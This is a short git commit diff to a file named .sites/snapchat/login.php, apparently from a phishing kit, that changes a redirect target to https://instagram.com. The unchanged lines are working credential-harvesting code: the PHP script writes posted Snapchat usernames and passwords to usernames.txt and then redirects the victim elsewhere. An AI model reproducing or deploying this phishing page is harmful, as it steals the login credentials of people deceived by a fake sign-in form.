11e79d4526384c23c89ad4348969f22178829018
omrajpal13274 <92999504+omrajpal13274@users.noreply.github.com>
2022-06-01 15:52:23 +0530

    Update login.php

--- .sites/snapchat/login.php
+++ .sites/snapchat/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: instagram.com');
+header('Location: https://instagram.com');
 exit();
 ?>
